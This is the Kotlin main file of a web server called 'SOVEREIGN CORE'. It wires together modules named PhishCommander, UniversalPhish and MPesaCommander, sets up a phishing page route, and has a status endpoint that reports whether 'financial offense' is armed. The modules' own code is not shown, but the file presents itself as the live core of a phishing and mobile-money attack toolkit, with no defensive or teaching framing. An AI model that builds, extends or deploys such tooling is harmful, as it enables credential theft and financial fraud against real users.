package com.fardc.sigint.core

import io.javalin.Javalin
import java.time.Instant

fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE v2.4.0 (COMBAT-READY) boot OK")

    // 1. Initialisation du Noyau (Core)
    val vault = SecurityVault() 
    val reporter = MissionReporter(vault)
    val combatHandler = CombatModeHandler() // Cerveau tactique central

    // 2. Initialisation du Serveur
    val app = Javalin.create { config ->
        config.showJavalinBanner = false
        config.http.defaultContentType = "text/plain; charset=utf-8"
    }.start(7070)

    // 3. Initialisation des Modules de Combat
    val bft = BFTModule(combatHandler)
    val mpesa = MPesaCommander(vault, combatHandler) // Intègre désormais le handler
    val phish = PhishCommander(vault, combatHandler) // Intègre désormais le handler
    val universal = UniversalPhish(vault, combatHandler)

    // 4. Enregistrement des Capacités (Routes)
    bft.setup(app)
    mpesa.setup(app)
    phish.setupPhishPage(app)
    universal.setup(app)
    combatHandler.setupRoutes(app)

    // 5. Endpoints de Gestion et Status
    app.get("/admin/report") { ctx ->
        val mode = combatHandler.getStatus()
        println("📝 [TRIGGER] Rapport généré en mode: $mode")
        reporter.generateDailyReport()
        ctx.result("📊 RAPPORT GÉNÉRÉ - ÉTAT TACTIQUE: $mode")
    }

    app.get("/status") { ctx -> 
        val statusInfo = """
            [SOVEREIGN-CORE V2.4.0]
            STATUS: ONLINE
            ACTUAL_MODE: ${combatHandler.getStatus()}
            BFT_LINK: ${if(combatHandler.isBFTOperational()) "ACTIVE" else "SILENT"}
            CYBER_FIN: ${if(combatHandler.isFinancialOffenseAllowed()) "ARMED" else "LOCKED"}
            TIME: ${Instant.now()}
        """.trimIndent()
        ctx.result(statusInfo)
    }
}
